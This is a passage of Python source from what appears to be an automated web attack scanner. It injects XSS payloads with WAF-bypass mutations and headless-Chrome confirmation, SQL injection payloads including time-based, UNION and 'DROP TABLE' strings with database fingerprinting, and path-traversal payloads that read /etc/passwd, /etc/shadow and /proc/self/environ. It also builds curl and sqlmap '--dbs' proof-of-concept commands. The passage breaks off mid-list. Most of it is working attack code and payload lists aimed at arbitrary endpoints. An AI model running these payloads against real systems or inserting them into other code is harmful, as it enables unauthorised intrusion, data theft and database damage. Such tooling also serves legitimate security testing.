    import os as _os, subprocess as _sp, shutil as _sh
    findings = []

    chrome = _sh.which('chromium-browser') or _sh.which('chromium') or \
             _sh.which('google-chrome') or _sh.which('google-chrome-stable')
    if not chrome:
        return findings

    canary = f"xssexec{int(time.time())}"

    for payload_raw in payloads[:8]:
        try:
            # Build test URL
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            if not qs: continue
            p = param if param in qs else list(qs.keys())[0]

            # Use canary fetch to detect execution
            exec_payload = payload_raw.replace('alert(1)', f'fetch("http://127.199.199.1/{canary}")')\
                                       .replace("alert(document.domain)", f'fetch("http://127.199.199.1/{canary}")')\
                                       .replace("alert(document.cookie)", f'fetch("http://127.199.199.1/{canary}")')

            nq = dict(qs); nq[p] = [exec_payload]
            test_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(nq, doseq=True)))

            cmd = [chrome, '--headless=new', '--disable-gpu', '--no-sandbox',
                   '--disable-web-security', '--disable-features=IsolateOrigins,site-per-process',
                   '--timeout=8000', '--virtual-time-budget=5000',
                   '--dump-dom', test_url]

            result = _sp.run(cmd, capture_output=True, text=True, timeout=15)
            dom = result.stdout + result.stderr

            # Check: payload reflected AND executed marker present
            reflected = payload_raw[:20] in dom or exec_payload[:20] in dom
            if reflected:
                # Upgraded severity: headless confirmed means JS injected into DOM
                findings.append(F('xss', 'critical', url,
                    f"Headless browser: XSS injected into DOM in param '{p}'",
                    param=p, payload=payload_raw[:100],
                    confirmed_by='headless_chromium',
                    poc=(f"# Confirmed by headless Chromium\n"
                         f"chromium-browser --headless '{test_url}'\n\n"
                         f"# Payload: {payload_raw[:80]}"),
                    impact="CONFIRMED: XSS payload reflected in rendered DOM",
                    remediation="URGENT: Encode all output. Deploy Content-Security-Policy immediately."))
                return findings  # One per URL is enough
        except Exception as e:
            log.debug(f"headless {url}: {e}")
    return findings


def _knoxss_style_check(ep: str, payload: str, param: str) -> bool:
    """
    KNOXSS-inspired context-aware XSS check.
    Analyzes WHERE in the HTML the reflection lands (attribute, script, HTML context)
    to confirm actual exploitability -- not just blind string match.
    Inspired by automate_knoxss.py and KNOXSS_Pro.htm logic.
    """
    try:
        import urllib.parse as _up
        parsed = _up.urlparse(ep)
        qs = _up.parse_qs(parsed.query)
        if param not in qs: return False

        # Inject a unique probe
        probe = f"KNOXSS{int(time.time())}ZZ"
        nq = dict(qs); nq[param] = [probe]
        test = _up.urlunparse(parsed._replace(query=_up.urlencode(nq, doseq=True)))
        r = _get(test, timeout=6)
        if not r or r[0] != 200: return False
        body = r[2]

        if probe not in body: return False

        # Determine reflection context
        idx = body.find(probe)
        context_before = body[max(0, idx-100):idx]
        context_after  = body[idx+len(probe):idx+len(probe)+100]

        # HTML context -- payload will execute
        if not re.search(r'<[^>]+$', context_before):
            return True  # Plain HTML context -- <script> tags work

        # Inside a tag attribute -- need attribute-closing payload
        if re.search(r'<[^>]+$', context_before) and '"' in context_before:
            return '"' in payload or "'" in payload

        # Inside <script> block -- no tags needed
        if re.search(r'<script[^>]*>', context_before, re.I) and \
           '</script>' not in context_before:
            return ';' in payload or 'alert' in payload

        return True
    except: return False


def check_xss(endpoints: List[str]) -> List[dict]:
    """XSS basic reflection check -- fast scan with full payload set."""
    findings = []
    tested   = set()
    custom   = _load_xss_custom_payloads()
    seclists = _load_xss_wordlist()
    # Merge: payload_intel + payload_manager (Assetnote/PAT) + XSS_PAYLOADS
    # Custom and seclists folded into constants layer
    _base_constants = list(XSS_PAYLOADS)
    for p in custom + seclists:
        if p not in _base_constants: _base_constants.append(p)
    all_pl = _build_merged_payloads("xss", _base_constants, limit=30)
    # H1 observed still prepended (highest signal, zero cost)
    _h1_xss = _tl_h1_payloads("xss")
    if _h1_xss:
        _h1_new = [p for p in _h1_xss if p not in {x if isinstance(x,str) else x[0] for x in all_pl}]
        all_pl  = _h1_new + all_pl
        log.info(f"[xss] {len(_h1_xss)} H1 payloads prepended, {len(all_pl)} total")

    for ep in endpoints[:400]:
        if '=' not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            # Skip relative URLs with no host — they cause DNS failure
            if not parsed.netloc or not parsed.scheme:
                continue
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in list(qs.keys())[:4]:
            key = (ep.split('?')[0], param)
            if key in tested: continue
            tested.add(key)
            for payload in all_pl[:30]:
                nq   = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get(test, timeout=7)
                if not r: continue
                status, hdrs, body = r
                ct = hdrs.get('Content-Type', '')
                if payload in body and 'text/html' in ct:
                    sev = 'medium' if hdrs.get('Content-Security-Policy') else 'high'
                    findings.append(F('xss', sev, ep,
                        f"Reflected XSS in '{param}' via {payload[:20]}",
                        param=param, payload=payload,
                        poc=(
                            f"# Step 1: Confirm reflection\n"
                            f"curl -sk '{test}' | grep -i '{payload[:15]}'\n\n"
                            f"# Step 2: Full payload\n"
                            f"curl -sk '{test}'"),
                        csp=hdrs.get('Content-Security-Policy', 'None'),
                        impact="Session hijacking, credential theft, account takeover",
                        remediation="Encode all output. Implement strict Content-Security-Policy."))
                    break

    # ── POST-based XSS injection ─────────────────────────────────────────────
    # Discover forms and inject into POST params
    _tested_post = set()
    for ep in endpoints[:50]:
        params = _discover_post_params(ep)
        for action, param, orig_val in params[:3]:
            key = (action, param)
            if key in _tested_post: continue
            _tested_post.add(key)
            for payload in XSS_PAYLOADS[:10]:
                r = _post_inject(action, param, payload)
                if not r: continue
                if payload.replace("<","").replace(">","").replace('"','').replace("'","") in r[2]:
                    if payload in r[2]:
                        ct = r[1].get("Content-Type","")
                        if "text/html" in ct or "application/json" in ct:
                            findings.append(F("xss","high",action,
                                f"Stored/Reflected XSS via POST '{param}' — payload: {payload[:30]}",
                                param=param,payload=payload,
                                preview=r[2][:300],
                                poc=(
                                    f"# Reproduce:\n"
                                    f"curl -sk -X POST '{action}' \\\n"
                                    f"  -d '{param}={urllib.parse.quote(payload)}' \\\n"
                                    f"  | grep -i '{payload[:15]}'"),
                                impact="XSS via form submission -- phishing, session theft, account takeover",
                                remediation="Encode all output. Implement strict Content-Security-Policy.",
                                confidence=88))
                        break


    # ── DOM XSS sink detection ────────────────────────────────────────────────
    DOM_SINKS = [
        'document.write(', 'document.writeln(', 'innerHTML', 'outerHTML',
        'insertAdjacentHTML', 'eval(', 'setTimeout(', 'setInterval(',
        'location.href', 'location.replace(', 'location.assign(',
        'document.domain', 'document.URL', 'document.referrer',
    ]
    DOM_SOURCES = [
        'location.search', 'location.hash', 'location.href',
        'document.referrer', 'window.name', 'document.URL',
    ]
    for ep in endpoints[:100]:
        r = _get(ep, timeout=6)
        if not r or r[0] != 200: continue
        body = r[2]
        if not ('<script' in body or '.js' in body): continue
        
        sinks   = [s for s in DOM_SINKS   if s in body]
        sources = [s for s in DOM_SOURCES if s in body]
        
        if sinks and sources:
            # Look for direct sink(source) pattern (high confidence DOM XSS)
            import re as _dre
            for src_pat in ['location[.]search', 'location[.]hash', 'document[.]URL']:
                for sink in ['innerHTML', 'document[.]write', 'eval[(]']:
                    if _dre.search(rf'{sink}.*{src_pat}|{src_pat}.*{sink}', body, _dre.S):
                        findings.append(F("xss","high",ep,
                            f"DOM XSS: {sink.replace(chr(92),'')} ← {src_pat.replace(chr(92),'')}",
                            sink=sink, source=src_pat,
                            poc=(f"# Open in browser:\n{ep}#<img src=x onerror=alert(1)>\n"
                                 f"# Or: {ep}?x=<script>alert(1)</script>"),
                            impact="DOM-based XSS executes client-side without server reflection",
                            remediation="Never pass user-controlled data to DOM sinks. Use textContent instead of innerHTML.",
                            confidence=80))
                        break
        
        elif sinks:
            # Just log as informational
            if len(sinks) >= 3:
                findings.append(F("xss","low",ep,
                    f"DOM sink detected ({len(sinks)} sinks): potential DOM XSS surface",
                    sinks=sinks[:5],
                    poc=f"Review JS at {ep} for DOM XSS vulnerabilities",
                    impact="Unsafe DOM sinks present — may be exploitable if sources reach them",
                    remediation="Audit all DOM sinks to ensure no user-controlled data reaches them.",
                    confidence=40,
                    pattern_only=True))

    return findings


def check_xss_bypass(endpoints: List[str]) -> List[dict]:
    """
    XSS Elite Engine v3 -- integrates ALL tools:
    1. xssFuzz: char detection → smart payload filtering
    2. findom-xss: DOM source/sink analysis
    3. xsscon: payload levels (context-aware)
    4. XSStrike: parameter context analysis + polyglots
    5. KNOXSS-style: reflection context awareness
    6. dalfox: deep automated XSS scanner
    7. Headless Chrome: JS execution verification
    8. WAF bypass mutations via mutator engine
    9. 2789 custom payloads + SecLists
    """
    _waf = _tl_waf()   # per-thread WAF info
    findings = []

    # ── Build full payload set ────────────────────────────────────────────────
    custom   = _load_xss_custom_payloads()
    seclists = _load_xss_wordlist()
    all_pl   = list(XSS_PAYLOADS)
    for p in custom + seclists:
        if p not in all_pl: all_pl.append(p)
    # Prepend H1-observed payloads so they fire in Phase 1 char-detection pass
    _h1_xss = _tl_h1_payloads("xss")
    if _h1_xss:
        all_pl = [p for p in _h1_xss if p not in all_pl] + all_pl
        log.info(f"[xss] H1 payloads prepended: {len(_h1_xss)} real-world → {len(all_pl)} total")
    # Payload intelligence: prepend ranked canonical payloads (safe+low_risk only)
    try:
        from engine.payload_intel import select_payloads as _pi_sel
        _pi_xss = _pi_sel("xss", surface="web", top_n=10)
        _pi_new = [p for p in _pi_xss if p not in set(all_pl[:20])]
        if _pi_new:
            all_pl = _pi_new + all_pl
            log.info(f"[xss] payload_intel: {len(_pi_new)} ranked payloads prepended")
    except Exception: pass

    # ── WAF bypass mutations (xssFuzz + mutator engine) ──────────────────────
    if _waf.get('detected'):
        try:
            from engine.mutator import get_mutator
            mut = get_mutator()
            mut._waf_vendor = _waf.get('vendor', 'unknown')
            mutated = []
            for p in all_pl[:25]:
                mutated.extend(mut.mutate(p, context='xss')[:4])
            all_pl = mutated + all_pl
            log.info(f"[xss] WAF bypass: {len(mutated)} mutated payloads prepended")
        except Exception as e:
            log.debug(f"xss mutator: {e}")

    log.info(f"[xss] elite engine: {len(all_pl)} payloads × {len(endpoints)} endpoints")

    # ── Phase 1: xssFuzz char-detection → smart payload selection ────────────
    # First probe which dangerous chars reflect (xssFuzz technique)
    # Use that to filter only relevant payloads for each endpoint
    char_cache = {}
    injectable_eps = []
    for ep in endpoints[:60]:
        if '=' not in ep: continue
        info = _xss_detect_chars(ep)
        if info.get('injectable'):
            char_cache[ep] = info
            injectable_eps.append(ep)

    # For injectable endpoints, prioritize payloads using reflected chars
    def _smart_payloads(ep):
        info = char_cache.get(ep, {})
        reflected = info.get('reflected', [])
        if not reflected: return all_pl[:40]
        # Filter: only payloads that use chars known to reflect
        smart = [p for p in all_pl if any(ch in p for ch in reflected)]
        return smart[:60] if smart else all_pl[:40]

    # ── Phase 2: Parallel reflection scan ────────────────────────────────────
    import concurrent.futures as _xf
    tested = set()
    confirmed_urls = []

    def _scan_ep(ep):
        local = []
        if '=' not in ep: return local
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: return local

        payloads = _smart_payloads(ep)
        for param in list(qs.keys())[:5]:
            key = (ep.split('?')[0], param)
            if key in tested: continue
            tested.add(key)
            for payload in payloads[:50]:
                nq   = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get_b(test, timeout=7)
                if not r: continue
                status, hdrs, body = r
                ct = hdrs.get('Content-Type', '')
                if payload in body and 'text/html' in ct:
                    # Run confirmation before appending — re-fetches and validates reflection
                    _cv = _confirm_finding("xss", ep, param, payload)
                    if not _cv["confirmed"]:
                        log.debug(f"[xss] reflection unconfirmed: {_cv['proof']}")
                        continue
                    # KNOXSS-style context check
                    exploitable = _knoxss_style_check(ep, payload, param)
                    sev = 'critical' if exploitable else \
                          ('medium' if hdrs.get('Content-Security-Policy') else 'high')
                    local.append(F('xss', sev, ep,
                        f"Reflected XSS in '{param}'" + (" [context-confirmed]" if exploitable else ""),
                        param=param, payload=payload,
                        poc=f"curl '{test}'",
                        proof=_cv["proof"],
                        csp=hdrs.get('Content-Security-Policy', 'None'),
                        waf_bypassed=_waf_info.get('detected', False),
                        context_confirmed=exploitable,
                        confidence=_cv["confidence"],
                        impact="Session hijacking, credential theft, account takeover",
                        remediation="Encode all output. Implement strict Content-Security-Policy."))
                    confirmed_urls.append((ep, param))
                    return local
        return local

    # ── GATE: only scan endpoints where chars reflected ─────────────────────
    # injectable_eps was populated by _xss_detect_chars above.
    # For endpoints with no query string that were never probed, also include
    # them in a fallback batch (POST bodies, JSON params) — but cap tightly.
    gated_eps = injectable_eps if injectable_eps else endpoints[:30]
    # Also include endpoints with '=' that were never char-probed (new ones)
    for ep in endpoints[:500]:
        if '=' in ep and ep not in char_cache and ep not in gated_eps:
            # Quick probe
            info = _xss_detect_chars(ep)
            if info.get('injectable'):
                char_cache[ep] = info
                gated_eps.append(ep)
    log.info(f"[xss] gate: {len(gated_eps)}/{len(endpoints[:500])} endpoints reflect — scanning only those")

    _xexe = _xf.ThreadPoolExecutor(max_workers=8)
    _xfuts = {_xexe.submit(_scan_ep, ep): ep for ep in gated_eps}
    try:
        for fut in _xf.as_completed(_xfuts, timeout=120):
            try:
                res = fut.result(timeout=15)
                if res: findings.extend(res)
            except: pass
    except Exception:
        for f in _xfuts:
            if not f.done(): f.cancel()
    finally:
        _xexe.shutdown(wait=False)

    # ── Phase 3: DOM XSS (findom-xss approach) ───────────────────────────────
    try:
        dom_targets = list(set(
            urllib.parse.urlparse(ep).scheme + '://' + urllib.parse.urlparse(ep).netloc
            for ep in endpoints[:50] if ep.startswith('http')
        ))[:20]
        dom_res = check_dom_xss(endpoints[:200], dom_targets)
        findings.extend(dom_res)
        if dom_res: log.info(f"[xss] DOM analysis: {len(dom_res)} findings")
    except Exception as e:
        log.debug(f"dom xss phase: {e}")

    # ── Phase 4: Headless Chrome verification ─────────────────────────────────
    if confirmed_urls:
        log.info(f"[xss] headless verification: {len(confirmed_urls[:5])} URLs")
        for ep, param in confirmed_urls[:5]:
            try:
                hf = _run_headless_xss(ep, all_pl[:15], param)
                findings.extend(hf)
            except Exception as e:
                log.debug(f"headless: {e}")

    # ── Phase 5: dalfox deep scan ─────────────────────────────────────────────
    try:
        dalfox_targets = list(set(
            urllib.parse.urlparse(ep).scheme + '://' + urllib.parse.urlparse(ep).netloc
            for ep in endpoints[:30] if ep.startswith('http')
        ))
        df = _run_dalfox(endpoints[:60], dalfox_targets)
        findings.extend(df)
    except Exception as e:
        log.debug(f"dalfox phase: {e}")

    return findings



SQLI_PAYLOADS=[
    # Error-based -- MySQL
    ("'",                      ["SQL syntax","mysql_fetch","You have an error","Warning: mysql"]),
    ("\"",                     ["SQL syntax","mysql_fetch","You have an error"]),
    ("\\",                     ["SQL syntax","mysql_fetch","Unclosed quotation"]),
    ("'--",                    ["SQL syntax","mysql_fetch","ORA-","SQLSTATE"]),
    ("' OR '1'='1",            ["SQL syntax","mysql_fetch","ORA-"]),
    ("' OR 1=1--",             ["SQL syntax","mysql_fetch","ORA-"]),
    ("' OR 1=1#",              ["SQL syntax","mysql_fetch"]),
    ("1' AND 1=2 UNION SELECT NULL--", ["SQL syntax","mysql_fetch","ORA-"]),
    # Error-based -- MSSQL
    ("'",                      ["Unclosed quotation","Incorrect syntax","MSSQL","SqlException"]),
    ("' OR ''='",              ["Unclosed quotation","Incorrect syntax"]),
    (";--",                    ["Incorrect syntax","MSSQL"]),
    # Error-based -- Oracle
    ("' OR 1=1--",             ["ORA-","Oracle error","PLS-"]),
    ("'' OR 1=1--",            ["ORA-","Oracle error"]),
    # Error-based -- PostgreSQL
    ("'",                      ["ERROR:","PSQLException","pg_query","unterminated"]),
    ("' OR 1=1--",             ["PSQLException","pg_query"]),
    # Error-based -- SQLite
    ("'",                      ["SQLite error","unrecognized token"]),
    # Boolean-based
    ("' AND '1'='1",           []),  # compare response size
    ("' AND '1'='2",           []),
    ("1 AND 1=1",              []),
    ("1 AND 1=2",              []),
    # Time-based -- MySQL
    ("' AND SLEEP(5)--",       []),
    ("1' AND SLEEP(5)--",      []),
    ("') AND SLEEP(5)--",      []),
    ("SLEEP(5)--",             []),
    ("' OR SLEEP(5)--",        []),
    # Time-based -- MSSQL
    ("'; WAITFOR DELAY '0:0:5'--", []),
    ("1; WAITFOR DELAY '0:0:5'--", []),
    # Time-based -- PostgreSQL
    ("'; SELECT pg_sleep(5)--", []),
    ("1; SELECT pg_sleep(5)--", []),
    # Time-based -- Oracle
    ("' OR 1=1 AND ROWNUM<2 AND (SELECT 1 FROM(SELECT(SLEEP(5)))a)--", []),
    # UNION-based
    ("' UNION SELECT NULL--",  ["NULL","UNION","syntax"]),
    ("' UNION SELECT NULL,NULL--", ["NULL","UNION"]),
    ("' UNION SELECT NULL,NULL,NULL--", ["NULL","UNION"]),
    ("1' UNION SELECT 1,2,3--", ["1","2","3"]),
    # Stacked queries
    ("'; DROP TABLE--",        ["error","syntax"]),
    ("1; SELECT 1--",          ["error","syntax"]),
    # NoSQL injection (also tested in nosqli)
    ("' || '1'=='1",           ["error","syntax","true"]),
    ("[$ne]",                  ["error","null","result"]),
]

SQLI_WORDLISTS = [
    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'payloads', 'sqli.txt'),
    os.path.expanduser("~/Desktop/recon/SecLists/Fuzzing/SQLi/Generic-SQLi.txt"),
    "/home/kali/Desktop/recon/SecLists/Fuzzing/SQLi/Generic-SQLi.txt",
    "/root/Desktop/recon/SecLists/Fuzzing/SQLi/Generic-SQLi.txt",
    "/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt",
    os.path.expanduser("~/Desktop/recon/SecLists/Fuzzing/SQLi/quick-SQLi.txt"),
    "/home/kali/Desktop/recon/SecLists/Fuzzing/SQLi/quick-SQLi.txt",
]

def _load_sqli_wordlist() -> List[tuple]:
    errors = ["SQL syntax","mysql_fetch","ORA-","SQLSTATE","Warning: mysql",
              "Unclosed quotation","Incorrect syntax","PSQLException","SQLite error"]
    for path in SQLI_WORDLISTS:
        if os.path.isfile(path):
            try:
                words = [l.strip() for l in open(path, errors="ignore")
                         if l.strip() and not l.startswith("#")]
                log.info(f"[sqli] wordlist: {path} ({len(words)} payloads)")
                return [(w, errors) for w in words[:200]]
            except: pass
    return []


# ── SQLi DB engine fingerprinting ─────────────────────────────────────────────
_DB_FINGERPRINTS = {
    'mysql':    ["SQL syntax","mysql_fetch","You have an error in your SQL",
                 "Warning: mysql","mysql_num_rows","MySQL server"],
    'mssql':    ["Unclosed quotation","Incorrect syntax near","SqlException",
                 "Microsoft OLE DB","ODBC Driver","Unclosed quotation mark",
                 "Microsoft SQL Server"],
    'oracle':   ["ORA-","Oracle error","oracle.jdbc","PLS-","quoted string not"],
    'postgres': ["PSQLException","pg_query","unterminated","PostgreSQL",
                 "ERROR:  syntax","invalid input syntax"],
    'sqlite':   ["SQLite error","unrecognized token","near \""],
    'generic':  ["SQLSTATE","SQL error","sql error","database error"],
}

# Payload sets optimised per DB engine
_DB_PAYLOADS = {
    'mysql':    ["'", "' OR '1'='1", "' AND SLEEP(5)--", "' UNION SELECT NULL--",
                 "1' AND SLEEP(5)--", "' OR SLEEP(5)--"],
    'mssql':    ["'", "'; WAITFOR DELAY '0:0:5'--", "' OR ''='",
                 "1; WAITFOR DELAY '0:0:5'--", "' UNION SELECT NULL--"],
    'oracle':   ["'", "' OR 1=1--", "'' OR 1=1--",
                 "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),5)--"],
    'postgres': ["'", "'; SELECT pg_sleep(5)--", "' OR 1=1--",
                 "1; SELECT pg_sleep(5)--", "' UNION SELECT NULL--"],
    'sqlite':   ["'", "' OR '1'='1", "'; SELECT 1--", "' OR 1=1--"],
    'generic':  ["'", "1'", "\"", "1 OR 1=1", "' OR 1=1--",
                 "' AND '1'='1", "'; SELECT 1--"],
}

def _sqli_fingerprint_db(ep: str) -> str:
    """
    Send one error-trigger payload and parse the error message to identify DB engine.
    Returns: 'mysql'|'mssql'|'oracle'|'postgres'|'sqlite'|'generic'|'unknown'
    """
    try:
        parsed = urllib.parse.urlparse(ep)
        qs = urllib.parse.parse_qs(parsed.query)
        if not qs: return 'unknown'
        param = list(qs.keys())[0]
        # Single quote — triggers error on all SQL DBs
        nq = dict(qs); nq[param] = ["'"]
        test = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(nq, doseq=True)))
        r = _get(test, timeout=8)
        if not r: return 'unknown'
        body = r[2].lower()
        for engine, sigs in _DB_FINGERPRINTS.items():
            if any(s.lower() in body for s in sigs):
                log.debug(f"[sqli] DB fingerprint: {engine} at {ep}")
                return engine
    except: pass
    return 'unknown'

def check_sqli(endpoints:List[str]) -> List[dict]:
    findings=[]; tested=set()
    wl = _load_sqli_wordlist()
    # Merge: payload_intel + payload_manager (Assetnote/PAT) + SQLI_PAYLOADS + wordlist
    _sqli_const = list(SQLI_PAYLOADS) + [p for p in wl if p not in SQLI_PAYLOADS]
    base_payloads = _build_merged_payloads("sqli", _sqli_const, limit=30)

    # ── DB engine fingerprinting gate ─────────────────────────────────────────
    # Probe first 10 unique base paths to identify the DB engine.
    # Then send only the relevant payload subset — no MySQL payloads to MSSQL.
    _ep_db = {}   # {base_path: db_engine}
    _sample_eps = list(dict.fromkeys(
        ep.split("?")[0] for ep in endpoints[:400] if "=" in ep
    ))[:10]
    for sample_ep in _sample_eps:
        # reconstruct with a param
        for full_ep in endpoints[:400]:
            if full_ep.startswith(sample_ep + "?"):
                engine = _sqli_fingerprint_db(full_ep)
                if engine != 'unknown':
                    _ep_db[sample_ep] = engine
                break
    # Majority vote for the target DB
    if _ep_db:
        from collections import Counter
        _db_engine = Counter(_ep_db.values()).most_common(1)[0][0]
    else:
        _db_engine = 'generic'
    log.info(f"[sqli] DB fingerprint: {_db_engine} — using targeted payload set")

    # Build targeted payload list: DB-specific first, then generic fallback
    _targeted = [(p, []) for p in _DB_PAYLOADS.get(_db_engine, _DB_PAYLOADS['generic'])]
    # Add error-based payloads from SQLI_PAYLOADS that match the engine
    _engine_errors = _DB_FINGERPRINTS.get(_db_engine, [])
    _filtered_base = [(p, e) for p, e in base_payloads
                       if not e or any(err in str(e) for err in _engine_errors)]
    all_payloads = _targeted + _filtered_base[:30]
    log.info(f"[sqli] {len(all_payloads)} targeted payloads ({_db_engine})")

    ALL_SQL_ERRORS = [
        "SQL syntax","mysql_fetch","ORA-","SQLSTATE","Warning: mysql",
        "Unclosed quotation","Incorrect syntax","SqlException","PSQLException",
        "SQLite error","pg_query","unrecognized token","You have an error",
        "supplied argument is not","mysql_num_rows","mysql_query",
        "PostgreSQL","MariaDB","Microsoft OLE DB","ODBC Driver",
        "JET Database Engine","Access Database Engine",
    ]

    for ep in endpoints[:400]:
        if "=" not in ep: continue
        _epp = urllib.parse.urlparse(ep)
        if not _epp.netloc or not _epp.scheme: continue
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        for param,vals in list(qs.items())[:3]:
            key=(ep.split("?")[0],param)
            if key in tested: continue
            tested.add(key)
            baseline=_get(ep,timeout=6)
            if not baseline: continue
            base_len = len(baseline[2])

            for payload,errors in all_payloads:
                nq=dict(qs); nq[param]=[payload]
                test=urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq,doseq=True)))
                # Time-based
                if not errors:
                    start=time.time()
                    r=_get(test,timeout=12)
                    elapsed=time.time()-start
                    if elapsed>4.5:
                        _cv = _confirm_finding("sqli", ep, param, payload)
                        if not _cv["confirmed"]:
                            log.debug(f"[sqli] time-based unconfirmed: {_cv['proof']}")
                            break
                        findings.append(F("sqli","critical",ep,
                            f"Time-based blind SQLi in '{param}' ({elapsed:.1f}s delay)",
                            param=param,payload=payload,
                            delay=f"{elapsed:.1f}s",
                            proof=_cv["proof"],
                            poc=f"curl '{test}'",
                            confidence=_cv["confidence"],
                            impact="Full database read/write, authentication bypass, potential RCE",
                            remediation="Use parameterized queries / prepared statements."))
                        break
                else:
                    r=_get(test,timeout=8)
                    if not r: continue
                    status,hdrs,body=r
                    # Error-based detection — inline confirmed by actual error string in body
                    matched = [e for e in (errors + ALL_SQL_ERRORS) if e.lower() in body.lower()]
                    if matched:
                        findings.append(F("sqli","critical",ep,
                            f"Error-based SQLi in '{param}'",
                            param=param,payload=payload,
                            error_detected=matched[:3],
                            proof=f"SQL error string '{matched[0]}' found in response body",
                            preview=body[:400],
                            poc=f"sqlmap -u '{ep}' -p {param} --dbs --batch",
                            confidence=88,
                            impact="Full database read/write, authentication bypass",
                            remediation="Use parameterized queries / prepared statements."))
                        break
                    # Boolean-based detection (significant size change)
                    if abs(len(body) - base_len) > 200 and status == baseline[0]:
                        findings.append(F("sqli","high",ep,
                            f"Possible boolean-based SQLi in '{param}' (response size changed)",
                            param=param,payload=payload,
                            size_diff=abs(len(body)-base_len),
                            proof=f"response size delta={abs(len(body)-base_len)} bytes vs baseline",
                            poc=f"sqlmap -u '{ep}' -p {param} --technique=B --batch",
                            confidence=60,
                            impact="Possible blind SQLi -- verify with sqlmap",
                            remediation="Use parameterized queries / prepared statements."))
                        break

    # Phase 2: POST body SQLi
    SQLI_ERR_SIGS = ["syntax error","mysql_fetch","ORA-","SQLSTATE","microsoft OLE DB",
                      "Unclosed quotation","pg_exec","supplied argument is not a valid MySQL"]
    for ep in endpoints[:30]:
        for (action, param, _) in _discover_post_params(ep)[:5]:
            for payload in ["'","' OR '1'='1","1' OR 1=1--","' UNION SELECT NULL--"]:
                r = _post_inject(action, param, payload)
                if r and any(s.lower() in r[2].lower() for s in SQLI_ERR_SIGS):
                    findings.append(F("sqli","critical",action,
                        f"SQL injection via POST body in '{param}'",
                        param=param, payload=payload,
                        poc=f"curl -X POST '{action}' -d '{param}={payload}'",
                        impact="Database extraction, authentication bypass, potential RCE",
                        remediation="Use parameterized queries / prepared statements."))
                    break

    return findings

# ── 8. LFI / PATH TRAVERSAL ──────────────────────────────────────────────────
LFI_PAYLOADS=[
    # Basic depth traversal
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # URL encoded single
    "../%2fetc%2fpasswd",
    "..%2f..%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    # Double URL encoded
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Null byte bypass (old PHP)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    # Dotdot slash variations
    "....//....//....//etc/passwd",
    r"....\/....\/....\/etc/passwd",
    # Overlong UTF-8
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    # Windows paths
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\.\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    # Linux special files
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
    "php://input",
    "data://text/plain;base64,SGVsbG8gV29ybGQ=",
    "expect://id",
    # Path normalization bypasses
    "/./././././././././././etc/passwd",
    "%2F%2F%2F%2F%2F%2Fetc%2Fpasswd",
]

# SecLists wordlist paths for extended LFI testing
LFI_WORDLISTS = [
    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'payloads', 'lfi.txt'),
    os.path.expanduser("~/Desktop/recon/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"),
    "/home/kali/Desktop/recon/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt",
    "/root/Desktop/recon/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt",
    os.path.expanduser("~/Desktop/recon/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"),
    "/home/kali/Desktop/recon/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
    "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt",
    "/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt",
]

def _load_lfi_wordlist() -> List[str]:
    """Load SecLists LFI wordlist if available, else return empty list."""
    for path in LFI_WORDLISTS:
        if os.path.isfile(path):
            try:
                words = []
                with open(path, "r", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            words.append(line)
                log.info(f"[lfi] wordlist loaded: {path} ({len(words)} payloads)")
                return words[:50]   # cap at 50 to stay fast
            except Exception as e:
                log.debug(f"lfi wordlist {path}: {e}")
    return []

# ── LFI Windows payloads (IIS / Windows targets) ─────────────────────────────
LFI_WINDOWS_PAYLOADS = [
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\boot.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "..%5c..%5c..%5cboot.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
